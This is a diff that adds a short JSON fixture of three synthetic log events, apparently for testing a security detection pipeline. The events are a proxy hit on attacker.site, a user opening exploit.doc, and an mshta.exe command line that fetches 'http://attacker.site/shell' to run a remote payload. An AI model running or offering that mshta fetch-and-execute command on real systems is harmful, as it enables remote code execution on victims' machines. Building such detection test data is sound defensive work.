@@ -1,0 +1,24 @@
+[
+  {
+    "timestamp": "2025-05-18T11:00:00",
+    "client_ip": "192.168.1.50",
+    "url": "http://attacker.site/prompt_injection",
+    "status": "TCP_MISS/200",
+    "source_type": "proxy",
+    "vendor": "squid"
+  },
+  {
+    "timestamp": "2025-05-18T11:00:10",
+    "process_name": "explorer.exe",
+    "command_line": "C:\\Users\\Victim\\Downloads\\exploit.doc",
+    "source_type": "edr",
+    "vendor": "velociraptor"
+  },
+  {
+    "timestamp": "2025-05-18T11:00:20",
+    "process_name": "mshta.exe",
+    "command_line": "mshta.exe http://attacker.site/shell",
+    "source_type": "edr",
+    "vendor": "velociraptor"
+  }
+]
